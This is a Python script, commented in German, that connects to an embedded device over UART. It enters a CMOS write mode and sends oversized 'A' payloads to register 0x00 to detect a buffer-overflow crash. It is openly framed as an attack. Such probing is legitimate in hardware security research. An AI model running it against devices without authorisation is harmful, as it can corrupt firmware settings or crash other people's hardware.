#!/usr/bin/env python3
"""
Final Attack (v2 - Timings Corrected)
======================================
Ein gezielter Angriff auf ein bekanntes, statisches Register. Die Timings
wurden korrigiert, um den "Uart Rx Buf Full"-Fehler zu vermeiden und das
wahre Verhalten des Geräts bei einem Overflow zu testen.
"""

import asyncio, sys, time, logging

# --- Setup (Logging, UART-Session, etc.) ---
logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)-4s [%(name)s] %(message)s", handlers=[logging.StreamHandler(sys.stdout)])
log = logging.getLogger("Overflow-Scanner-v2")

class UARTSession:
    def __init__(self, port: str, baud: int = 115200): self.port, self.baud, self.reader, self.writer = port, baud, None, None
    async def open(self): import serial_asyncio; self.reader, self.writer = await serial_asyncio.open_serial_connection(url=self.port, baudrate=self.baud); log.info(f"[UART] Connected to {self.port}")
    async def close(self): 
        if self.writer: self.writer.close(); await self.writer.wait_closed(); log.info("[UART] Closed")
    async def write(self, data: bytes): self.writer.write(data); await self.writer.drain()
    async def read_raw(self, timeout=2.5, n_bytes=4096) -> bytes | None:
        try: return await asyncio.wait_for(self.reader.read(n_bytes), timeout=timeout)
        except asyncio.TimeoutError: return None

async def enter_cmos_mode(sess: UARTSession):
    log.info("[i] Waiting for device prompt...")
    buf = b""; deadline = time.time() + 20; prompt_found = False
    while time.time() < deadline:
        data = await sess.read_raw(timeout=0.1)
        if data:
            buf += data
            if b"Please key" in buf and not prompt_found:
                prompt_found = True
                log.info("[i] Prompt detected! Sending 'c' to enter write mode...")
                await sess.write(b"c\r")
                break
    if not prompt_found: log.error("Device prompt not found."); return False
    log.info("[i] Waiting for 'Example:' confirmation prompt...")
    confirmation_buf = b""
    deadline = time.time() + 10
    while time.time() < deadline:
        data = await sess.read_raw(timeout=0.2)
        if data:
            confirmation_buf += data
            if b"Example:" in confirmation_buf:
                log.info("[SUCCESS] CMOS write mode confirmed and ready.")
                # Leere den Rest des Puffers, um saubere Antworten zu bekommen
                await asyncio.sleep(0.2)
                await sess.read_raw(timeout=0.5)
                return True
    log.error("[FAIL] Did not receive CMOS confirmation prompt."); return False

# --- Der gezielte Overflow-Angriff ---
async def overflow_attack(sess: UARTSession, target_addr: int):
    """Führt einen Buffer-Overflow-Angriff auf eine Ziel-Adresse durch."""
    log.info(f"--- Starting Write Overflow Attack on a known static register: 0x{target_addr:02x} ---")
    hex_addr = f"{target_addr:02x}"
    
    # Teste Längen von 1 bis 260 Bytes
    for length in list(range(1, 17)) + [32, 64, 128, 256, 260]:
        log.info(f"[ATTACK] Trying to write {length} bytes to register 0x{hex_addr}...")
        
        overflow_payload_hex = ('41' * length)
        command_str = f"01{hex_addr}{overflow_payload_hex}\r"
        await sess.write(command_str.encode())
        
        # <<< HIER IST DIE KORREKTUR >>>
        # Wir fügen die entscheidende Pause wieder ein, um den Puffer nicht zu überfluten.
        await asyncio.sleep(0.2)
        
        # Warte und prüfe, ob das Gerät noch antwortet
        response = await sess.read_raw()
        
        if response:
            log.warning(f"[RESPONSE at length {length}] Device is still alive. Response: {response.strip()}")
        else:
            log.critical(f"\n[!!! POTENTIAL CRASH !!!]")
            log.critical(f"Device did not respond after sending {length} bytes to register 0x{hex_addr}.")
            log.critical("This is a very promising sign for a buffer overflow vulnerability.")
            log.critical("Please reboot the device and check for a different behavior.")
            return

    log.info("--- Overflow Attack finished. The device seems robust against this vector. ---")

async def main():
    if len(sys.argv) < 2: log.error(f"Usage: {sys.argv[0]} /dev/ttyUSB0"); return
    
    sess = UARTSession(sys.argv[1])
    try:
        await sess.open()
        if await enter_cmos_mode(sess):
            # Wir greifen das einzige bekannte statische Register an: 0x00
            await overflow_attack(sess, target_addr=0x00)
    finally:
        await sess.close()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        log.info("\nAttack terminated by user.")
